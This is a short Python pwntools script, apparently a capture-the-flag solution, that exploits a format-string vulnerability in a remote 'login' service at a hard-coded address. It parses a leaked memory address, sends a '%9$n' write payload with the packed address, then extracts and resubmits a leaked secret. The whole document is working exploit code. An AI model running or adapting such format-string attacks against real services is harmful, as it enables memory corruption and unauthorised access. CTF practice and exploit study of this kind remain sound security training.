from pwn import *

# conn = process('./login')
conn = remote('130.192.5.212', 17391)
# gdb.attach(conn, '')

intro = conn.recvuntil(b'What\'s your name?', drop=True)
address1 = intro.decode().split(' ')[-2]
print('address1:', address1)

payload = b'%9$n'
payload += b'A'*4
payload += p64(int(address1, 16))

print('payload:', payload)
conn.sendline(payload)

conn.interactive()

out = conn.recvuntil(b'Give me the secret:')
print(out)
secret = out.split(b'AAAA')[0].split(b' \n')[1]

print('secret:', secret)
conn.sendline(secret)
# out = out.replace('\n', ' ')
# addresses2 = out.split(' ')[3:-4]
# print(addresses2)

conn.interactive()